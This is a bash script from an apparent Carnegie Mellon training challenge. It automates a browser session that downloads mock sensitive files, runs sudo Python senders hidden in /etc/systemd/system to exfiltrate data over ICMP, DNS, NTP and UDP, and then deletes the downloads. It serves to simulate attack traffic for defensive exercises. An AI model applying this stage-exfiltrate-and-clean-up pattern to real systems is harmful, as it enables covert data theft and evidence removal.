#!/bin/bash

# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.


sleep 300

steelnumber=`vmtoolsd --cmd "info-get guestinfo.steelfile"`
exchangenumber=`vmtoolsd --cmd "info-get guestinfo.exchangefile"`
accountnumber=`vmtoolsd --cmd "info-get guestinfo.accountfile"`
fingerprintnumber=`vmtoolsd --cmd "info-get guestinfo.fingerprintfile"`

pkill firefox
firefox -P default-esr http://s7331.merch.codes &
sleep 3

# add exception
sleep 1
xdotool key Tab
sleep 1
xdotool key Return
sleep 1
xdotool key Tab
sleep 1
xdotool key Tab
sleep 1
xdotool key Tab
sleep 1
xdotool key Tab
sleep 1
xdotool key Return
sleep 5

# Login
xdotool key Tab
sleep 1
xdotool key Tab
sleep 1
xdotool key Tab
sleep 1
xdotool key Tab
sleep 1
xdotool key Tab
sleep 1
xdotool key Tab
sleep 1
xdotool key Tab
sleep 1
xdotool key Tab
sleep 1
xdotool key Tab
sleep 1
xdotool key Tab
sleep 1
xdotool key Return
sleep 1
xdotool key Tab
sleep 1
xdotool type "test"
sleep 1
xdotool key Tab
sleep 2
xdotool type "testpassword123"
sleep 1
xdotool key Return


# Browse to each tab
sleep $((RANDOM % 10 + 5))
firefox -P default-esr http://s7331.merch.codes/steel &
sleep $((RANDOM % 10 + 5))
firefox -P default-esr -new-window http://s7331.merch.codes/steel/new-steel-prototype-0${steelnumber}.txt &
sleep 3
xdotool key "ctrl+s"
sleep 3
xdotool type "/home/user/Downloads/steel"
sleep 3
xdotool key "Return"



firefox -P default-esr http://s7331.merch.codes/exchanges &
sleep $((RANDOM % 10 + 5))
firefox -P default-esr -new-window http://s7331.merch.codes/exchanges/meetup-location-0${exchangenumber}.txt &
sleep 3
xdotool key "ctrl+s"
sleep 3
xdotool type "/home/user/Downloads/meetup"
sleep 3
xdotool key "Return"

firefox -P default-esr http://s7331.merch.codes/accounts &
sleep $((RANDOM % 10 + 5))
firefox -P default-esr -new-window http://s7331.merch.codes/accounts/account-number-0${accountnumber}.txt &
sleep 3
xdotool key "ctrl+s"
sleep 3
xdotool type "/home/user/Downloads/account"
sleep 3
xdotool key "Return"

firefox -P default-esr http://s7331.merch.codes/fingerprints &
sleep $((RANDOM % 26 + 5))
firefox -P default-esr -new-window http://s7331.merch.codes/fingerprints/fingerprint-0${fingerprintnumber}.png &
sleep 3
xdotool key "ctrl+s"
sleep 3
xdotool type "/home/user/Downloads/fingerprint"
sleep 3
xdotool key "Return"
sleep 3

pkill firefox

### INSERT EXFIL ###
sudo python3 /etc/systemd/system/icmp-sender.py
sleep $((RANDOM % 10 + 10))
sudo python3 /etc/systemd/system/dns-sender.py
sleep $((RANDOM % 10 + 10))
sudo python3 /etc/systemd/system/ntp-sender.py
sleep $((RANDOM % 10 + 10))
sudo python3 /etc/systemd/system/udp-sender.py



### DELETE DOWNLOADS ###
sleep 30
rm /home/user/Downloads/*.*
